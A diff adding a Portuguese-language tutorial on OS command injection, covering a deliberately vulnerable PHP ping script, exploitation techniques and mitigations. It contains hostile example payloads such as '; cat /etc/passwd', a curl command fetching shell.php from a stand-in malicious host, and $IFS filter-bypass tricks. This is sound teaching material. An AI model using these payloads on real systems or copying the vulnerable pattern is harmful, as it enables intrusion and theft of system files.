@@ -1,0 +1,35 @@
+A injeção de comando é uma vulnerabilidade de segurança grave que permite que um atacante execute comandos arbitrários no sistema operacional. Isso ocorre quando uma aplicação passa entrada do usuário de forma não sanitizada para o shell ou interface de linha de comando do sistema.
+Como Funciona:
+
+A injeção de comando geralmente acontece quando a entrada do usuário é incorporada diretamente a comandos do sistema sem a devida validação ou sanitização. O atacante pode injetar comandos adicionais que serão executados no servidor.
+Exemplo (Vulnerabilidade em Código PHP):
+
+<?php
+    $ip = $_GET['ip'];
+    system("ping -c 4 " . $ip);
+?>
+
+Neste exemplo, o script PHP pega o IP inserido pelo usuário e o passa para a função system() para executar o comando ping. Se um atacante inserir 8.8.8.8; cat /etc/passwd, o servidor irá executar ping -c 4 8.8.8.8; cat /etc/passwd, o que pode levar a uma falha grave de segurança, revelando arquivos sensíveis do sistema.
+Técnicas de Exploração da Injeção de Comando:
+
+    Encadeamento de Comandos: Os atacantes podem usar separadores de comandos, como ponto e vírgula (;), && (AND) ou || (OR), para executar múltiplos comandos.
+        Exemplo: ping 8.8.8.8; ls / — Pingar o IP e listar os arquivos no diretório raiz.
+
+    Injeção de Argumentos: Nesse método, o atacante adiciona argumentos maliciosos a comandos existentes.
+        Exemplo com curl: curl http://malicioso.com -o shell.php
+
+    Backticks e Substituição: Essas técnicas permitem que o atacante injete um comando no original, usando acentos graves (``) ou a sintaxe $(...).
+        Exemplo: ping 8.8.8.8; $(cat /etc/passwd)
+
+    Bypass de Filtros: O atacante pode contornar filtros de entrada, utilizando truques como $IFS, expansão de chaves, codificação URL ou codificação em hexadecimal.
+        Exemplo: cat${IFS}/etc/passwd ou cat%20/etc/passwd (onde %20 é um espaço codificado em URL).
+
+    Exfiltração de Dados: Técnicas indiretas de exfiltração de dados, como ataques baseados em tempo ou DNS, podem ser usadas.
+        Exemplo: Usar uma função sleep combinada com condições if para inferir dados a partir de respostas do servidor baseadas em atrasos temporais.
+
+Como Mitigar a Injeção de Comando:
+
+    Evite Passar Entrada do Usuário Diretamente para o Shell: Nunca passe entrada de usuário diretamente para comandos ou chamadas de sistema. Use alternativas mais seguras como escapeshellcmd() ou escapeshellarg() no PHP.
+    Sanitização de Entrada: Implemente validação e sanitização rigorosa das entradas, permitindo apenas caracteres aceitáveis e rejeitando padrões suspeitos.
+    Use APIs Parametrizadas: Use APIs que não envolvem a passagem de entrada do usuário diretamente para o shell. Evite funções como system() ou exec() ao lidar com entradas de usuário.
+    Princípio do Mínimo Privilégio: Execute serviços com privilégios mínimos para limitar o impacto de qualquer ataque de injeção de comando.
